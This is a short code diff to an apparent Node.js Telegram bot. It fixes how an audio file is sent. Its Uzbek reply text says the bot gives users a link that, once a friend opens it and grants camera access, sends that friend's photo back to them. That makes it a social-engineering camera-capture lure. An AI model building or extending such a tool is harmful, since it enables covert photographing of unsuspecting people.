@@ -2,6 +2,7 @@ import express from "express";
 import TelegramBot from "node-telegram-bot-api";
 import path from "path";
 import { fileURLToPath } from "url";
+import fs from "fs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -59,7 +60,7 @@ bot.on("message", (msg) => {
       chatId,
       "Shunchaki 📸 Rasm olish tugmasni bosing berilgan linki dostingizga jonating. Agar dostinggiz linga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'gri yo'lda foydalaning."
     );
-    bot.sendAudio(chatId, "music/koryabman.mp3");
+    bot.sendAudio(chatId, fs.createReadStream("music/koryapman.mp3"));
   }
 });
 
